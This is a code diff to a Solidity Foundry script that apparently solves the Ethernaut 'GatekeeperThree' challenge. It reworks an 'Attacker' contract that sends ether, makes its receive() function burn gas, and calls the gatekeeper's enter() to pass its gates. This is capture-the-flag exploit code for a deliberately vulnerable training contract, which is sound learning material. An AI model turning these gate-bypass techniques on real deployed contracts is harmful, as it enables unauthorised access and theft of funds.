@@ -30,7 +30,11 @@ contract Attacker {
         // We have to sent 0.002 to GatekeeperThree in order to pass through address(this).balance > 0.001
         (bool sent, ) = address(gatekeeper).call{value: 2e15}("");
         require(sent, "Couldn't send ether");
+    }
 
+    // Bypass gateOne
+    // The receive() method is only invoked for transfers happening after the contract is fully deployed and operational
+    function enter() external {
         gatekeeper.enter();
     }
 
@@ -39,7 +43,7 @@ contract Attacker {
     // 1. Make our receive function to require more than 2300 gas 
     // 2. Can just not impelement receive or fallback functions
     receive() external payable {
-        for (uint16 i = 1; i < 1000; i++) {}
+        for (uint8 i = 1; i < 100; i++) {}
     }
 }
 
@@ -58,7 +62,10 @@ contract GatekeeperThreeScript is Script {
         console.log(trickAddr);
 
         // We deploy the Attacker contract with 0.001 because we will need to transfer ethers to GatekeeperThree
-        new Attacker{value: 2e15}(payable(address(gatekeeper)));
+        Attacker attacker = new Attacker{value: 2e15}(payable(address(gatekeeper)));
+        attacker.enter();
+
+        console.log("entrant", gatekeeper.entrant());
 
         vm.stopBroadcast();
     }
